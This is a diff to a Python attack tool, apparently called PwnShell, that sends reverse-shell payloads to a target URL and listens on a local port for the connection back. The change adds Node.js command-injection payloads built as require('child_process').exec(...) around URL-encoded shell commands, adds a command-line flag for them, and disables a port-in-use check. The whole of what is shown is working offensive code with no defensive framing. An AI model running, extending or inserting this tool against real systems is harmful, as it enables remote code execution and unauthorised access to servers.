@@ -55,9 +55,10 @@ class PwnShell:
 
     def shell_linux(self):  # Default option
         self.info()
-        self.base64_payloads()
-        # self.login()
-       # self.is_valid()
+        self.nodejs(self)
+        #self.base64_payloads()
+        #self.login()
+        #self.is_valid()
         #self.thread()  # leave it the last one
 
     #########################################################################################
@@ -225,10 +226,22 @@ class PwnShell:
                 req = requests.get(url,headers=request,verify=False)
                 print(req.status_code)
             time.sleep(5)
-            if self.is_port_in_use():
-                print("the port is in use")
-                break
+            #if self.is_port_in_use():
+                #print("the port is in use")
+                #break
 
+    #########################################################################################
+    ###################################  NODEJS PAYLOADS ####################################
+    def nodejs(self,payload):
+        payloads = PayLoads(self.ip, self.port).payloads()
+        for ini_payload in payloads:
+            encoded_payload = self.get_url_encoded_payload(ini_payload)
+            payload=f'''require('child_process').exec('{encoded_payload}')'''
+            print(payload)
+
+
+    #############################################################################################
+    ###################################  BASE64 ENCODING PAYLOADS ###############################
     def base64_payloads(self):
         payloads = PayLoads(self.ip, self.port).payloads()
         for payload in payloads:
@@ -272,12 +285,13 @@ if __name__ == '__main__':
         parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
         parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
         parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
+        parser.add_argument("-f", "--file", help='Request file')
+        parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
         parser.add_argument("-m", "--method", help='Request Method', default='post')
         parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
-        parser.add_argument("-f", "--file", help='Request file')
         args = parser.parse_args()
         ########################################################################
         ########################## Defining variables ##########################
